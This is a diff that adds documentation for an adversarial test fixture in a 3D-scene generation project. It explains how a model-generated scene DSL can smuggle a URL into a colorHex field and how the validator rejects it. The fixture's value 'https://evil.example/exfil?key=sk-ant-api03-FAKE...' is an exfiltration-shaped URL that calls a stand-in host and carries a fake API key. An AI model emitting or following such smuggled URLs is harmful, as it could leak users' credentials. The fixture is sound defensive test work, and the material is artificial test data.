@@ -1,0 +1,52 @@
+Fixture: fixtures/object3d/adversarial/object3d-node-dsl-color-url-smuggling.adversarial.json
+Schema: schemas/object3d/object3d-node.schema.json (structurally PASSES — see below)
+
+WHAT THIS FIXTURE SHOWS
+
+An ON_DEVICE_GENERATED node whose generation.rawOutputText is a syntactically valid
+ProceduralScene DSL JSON string (docs/design/objects-3d.md §4 "Primitive DSL"). Its one op's
+`colorHex` field is not a hex color at all — it is a URL with a credential-shaped query
+parameter appended: "https://evil.example/exfil?key=sk-ant-api03-FAKE...". This is exactly §6's
+first adversarial minimum: "a DSL smuggling a URL."
+
+WHY JSON SCHEMA VALIDATION ALONE CANNOT CATCH THIS
+
+schemas/object3d/object3d-node.schema.json's `generation.rawOutputText` is, deliberately, an
+opaque `type: string` (see that field's own $comment) — the DSL it carries is a sub-language
+this outer JSON Schema has no way to parse into or constrain. A string that happens to contain
+valid embedded JSON with a URL-shaped `colorHex` value is indistinguishable, at this schema's
+level, from any other non-empty string. The URL smuggling is only visible one layer down, inside
+the DSL's own semantics.
+
+REQUIRED REAL BEHAVIOR (docs/design/objects-3d.md §4's "invalid output -> one structured retry
+with the validator's complaint")
+
+A real on-device generation pipeline MUST, before ever writing a file or minting an Object3dNode
+from this rawOutputText, run it through:
+
+  1. dev.fonebrew.domain.object3d.ProceduralSceneCodec.decode (structural decode — this step
+     SUCCEEDS for this fixture; the JSON is well-formed) followed by
+  2. dev.fonebrew.domain.object3d.ProceduralSceneValidator.validate, whose `colorHex` check
+     requires `^#[0-9A-Fa-f]{6}([0-9A-Fa-f]{2})?$` — a URL never matches this pattern, so
+     validation MUST return ProceduralSceneValidation.Invalid with a reason naming
+     "ops[0] (id='box1'): colorHex '...' is not a #RRGGBB or #RRGGBBAA hex color".
+
+On that Invalid result, the pipeline MUST take the one structured retry §4 describes (handing the
+validator's complaint back to the model), and — if the retry ALSO fails validation — MUST fail
+honestly rather than ever writing a file, minting a node, or letting the viewer bridge (§3)
+dereference a string from this field as if it were trusted content. This is the same "the DSL
+never gets to smuggle a live capability past validation" obligation binding rule 5 (API keys never
+logged/leaked) and the fixed COLOR_HEX_PATTERN in
+dev.fonebrew.domain.object3d.ProceduralSceneValidator jointly enforce — see
+ProceduralSceneTest's "smuggled URL in colorHex is rejected by the validator" case, which decodes
+this exact fixture's rawOutputText and asserts the Invalid outcome.
+
+Rejection code: OBJECT3D_DSL_COLOR_NOT_HEX
+Severity: WARNING (this is model-output hygiene, not a security breach by itself — but see the
+embedded fake credential above: never let a validator failure reason ECHO the offending value
+into a log line verbatim in a way that could itself leak a real key; a real implementation should
+truncate/redact the offending string before logging it, distinct from the in-memory
+ValidationResult.reasons text this fixture's test asserts on directly).
+Retryable: true (one structured retry, per §4).
+Recovery action: re-prompt the model with the validator's reasons; on a second failure, fall back
+to an honest "could not generate a valid model" turn rather than persisting anything.
